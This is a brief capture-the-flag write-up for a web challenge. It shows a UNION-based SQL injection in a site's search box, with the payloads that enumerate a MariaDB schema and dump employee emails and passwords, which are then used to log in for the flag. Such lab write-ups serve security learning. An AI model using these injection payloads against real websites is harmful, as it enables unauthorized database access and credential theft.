# Challenges:

Log into BapeMusic to get the something...

FLAG Format: EHC{XXX}

# Solution:

They give me a nice looking website with 3 function Search, Sign up, Log in.

After sign up they told the sign up function not avalible, the Log in can't exploit anything because they filter all the symbol for sql injection. We only have last option is the search. I enter some "Entry point dection" symbol and found something at `"`:

![image](https://github.com/Katsumi1012/CTF/assets/90083485/489777dc-819a-48b7-ad1a-5cf25b6487cc)

MariaDB is very usefull and try a round with basic query and when trying this query `" UNION SELECT @@version; -- -`, i got:

![image](https://github.com/Katsumi1012/CTF/assets/90083485/8fa91f22-6065-4ab8-a1ca-036da1db153f)

Now, i know what i'm going to to. First check the number of columns and an error at column 5 so it has 4 columns

![image](https://github.com/Katsumi1012/CTF/assets/90083485/b7e441db-1976-46a5-b54c-5f480c16893d)

Get database name: `" UNION SELECT @@version,database(),3,4; -- -`

![image](https://github.com/Katsumi1012/CTF/assets/90083485/7802dfd8-fc11-4290-9361-d70bfd3fe0f8)

Discover the `sqlinjection`: `" UNION select TABLE_NAME,TABLE_SCHEMA,3,4 from INFORMATION_SCHEMA.TABLES where table_schema='sqlinjection'-- -`

![image](https://github.com/Katsumi1012/CTF/assets/90083485/ddb4da13-a674-4a09-95e6-4052df92b50b)

Discorver the `employee` table: `" UNION select COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.COLUMNS where table_name='employee'-- -` and we saw some interesting column:

![image](https://github.com/Katsumi1012/CTF/assets/90083485/2068ae98-2129-44aa-a314-8a15f92fe480)

Get in there to see data: `" UNION select Email, Password,3,4 from employee -- -`

![image](https://github.com/Katsumi1012/CTF/assets/90083485/5a26ce8f-4493-42b2-8f69-a71b6fd9de19)

Siuuuuu. We got the username and password. Now try to login

![1st](https://github.com/Katsumi1012/CTF/assets/90083485/d94cf8fe-7c4d-41a1-a5c6-d27272de7201)

Get the flag 🚩

# Enjoy 🤡
